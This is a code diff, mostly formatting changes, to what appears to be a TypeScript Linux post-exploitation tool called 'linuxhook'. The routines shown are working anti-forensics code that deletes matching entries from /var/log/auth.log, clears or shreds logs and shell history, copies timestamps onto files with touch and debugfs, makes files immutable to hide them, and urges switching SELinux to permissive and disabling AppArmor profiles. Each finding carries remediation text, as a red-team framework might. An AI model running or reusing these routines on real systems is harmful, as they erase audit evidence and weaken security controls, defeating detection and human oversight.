@@ -20,14 +20,17 @@ echo "--- Journald Status ---"
 systemctl status systemd-journald 2>/dev/null | head -5
 journalctl --disk-usage 2>/dev/null
 
-${pattern && file ? `
+${
+  pattern && file
+    ? `
 echo ""
 echo "--- Removing entries matching '${pattern}' from ${file} ---"
 before=$(wc -l < "${file}" 2>/dev/null)
 sed -i "/${pattern}/d" "${file}" 2>/dev/null
 after=$(wc -l < "${file}" 2>/dev/null)
 echo "Removed $((before - after)) line(s) from ${file}"
-` : `
+`
+    : `
 echo ""
 echo "--- Usage ---"
 echo "linuxhook log_tamper --file /var/log/auth.log --pattern '192.168.1.100'"
@@ -37,7 +40,8 @@ echo "  sed -i '/192.168.1.100/d' /var/log/auth.log"
 echo "  > /var/log/auth.log  (clear entire file)"
 echo "  shred -zu /var/log/auth.log  (secure delete)"
 echo "  echo '' | tee /var/log/syslog  (truncate)"
-`}
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -126,7 +130,10 @@ echo "  Or prefix commands with a space (if HISTCONTROL=ignorespace)"
     status: cleared > 0 ? "EXPLOITED" : "IDENTIFIED",
     resource: "shell_history",
     title: cleared > 0 ? `Shell history cleared (${cleared} files)` : "Shell history files enumerated",
-    details: cleared > 0 ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session` : "History files found — clear before exiting",
+    details:
+      cleared > 0
+        ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session`
+        : "History files found — clear before exiting",
     remediation: "Forward command history to a centralized audit system. Use auditd for command logging.",
   })
 
@@ -140,11 +147,15 @@ export async function timestomp(args: string[], timeout: number): Promise<HookRe
   const reference = argVal(args, "--reference")
 
   const script = `
-${target ? `
+${
+  target
+    ? `
 echo "--- Current Timestamps ---"
 stat "${target}" 2>/dev/null
 
-${reference ? `
+${
+  reference
+    ? `
 echo ""
 echo "--- Reference File Timestamps ---"
 stat "${reference}" 2>/dev/null
@@ -153,7 +164,8 @@ echo ""
 echo "--- Applying Timestamps ---"
 touch -r "${reference}" "${target}" 2>/dev/null && echo "[+] atime/mtime copied from ${reference} to ${target}"
 stat "${target}" 2>/dev/null
-` : `
+`
+    : `
 echo ""
 echo "--- Modifying Timestamps ---"
 echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
@@ -163,13 +175,16 @@ echo "Manual approaches:"
 echo "  touch -r /bin/ls target_file        # copy timestamps from reference"
 echo "  touch -t 202301011200 target_file   # set specific timestamp"
 echo "  debugfs -w -R 'set_inode_field <inode> crtime 202301011200' /dev/sda1  # ctime (requires debugfs)"
-`}
-` : `
+`
+}
+`
+    : `
 echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
 echo ""
 echo "--- Recently Modified Files (last 24h) ---"
 find /tmp /var/tmp /dev/shm -newer /etc/hostname -type f 2>/dev/null | head -20
-`}
+`
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -288,7 +303,8 @@ echo "  semanage permissive -a httpd_t         # Set domain permissive"
       status: "IDENTIFIED",
       resource: "selinux",
       title: "SELinux is enforcing — restricts exploitation",
-      details: "SELinux in enforcing mode. Some exploits and persistence mechanisms may be blocked. Consider setting permissive or using unconfined contexts.",
+      details:
+        "SELinux in enforcing mode. Some exploits and persistence mechanisms may be blocked. Consider setting permissive or using unconfined contexts.",
       remediation: "Keep SELinux enforcing. Use targeted policy. Audit policy changes.",
     })
   }
@@ -357,7 +373,8 @@ echo "  ln -s /etc/apparmor.d/profile /etc/apparmor.d/disable/  # Disable on boo
       status: "IDENTIFIED",
       resource: "apparmor",
       title: `AppArmor active with ${enforced} enforcing profile(s)`,
-      details: "AppArmor profiles in enforce mode — may restrict exploitation. Set to complain mode or disable specific profiles.",
+      details:
+        "AppArmor profiles in enforce mode — may restrict exploitation. Set to complain mode or disable specific profiles.",
       remediation: "Keep AppArmor profiles enforcing. Audit profile changes.",
     })
   }
@@ -510,14 +527,18 @@ echo ""
 echo "--- Immutable Files ---"
 lsattr /tmp/ /var/tmp/ /dev/shm/ 2>/dev/null | grep "i" | head -10
 
-${target ? `
+${
+  target
+    ? `
 echo ""
 echo "--- Hiding ${target} ---"
 if [ -f "${target}" ]; then
   chattr +i "${target}" 2>/dev/null && echo "[+] Set immutable attribute on ${target}"
   echo "[*] File is now protected from deletion"
 fi
-` : ""}
+`
+    : ""
+}
 `
 
   const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
@@ -728,7 +749,8 @@ fi
     resource: "stealth",
     title: `${modes.length} stealth mode(s) available: ${modes.join(", ") || "none"}`,
     details: `Available stealth modes: ${modes.join(", ") || "none"}. Use --stealth <mode> flag with linuxhook commands.`,
-    remediation: "Mount /dev/shm with noexec. Restrict memfd_create via seccomp. Monitor for encoded command execution.",
+    remediation:
+      "Mount /dev/shm with noexec. Restrict memfd_create via seccomp. Monitor for encoded command execution.",
   })
 
   return { output: output.join("\n"), findings }
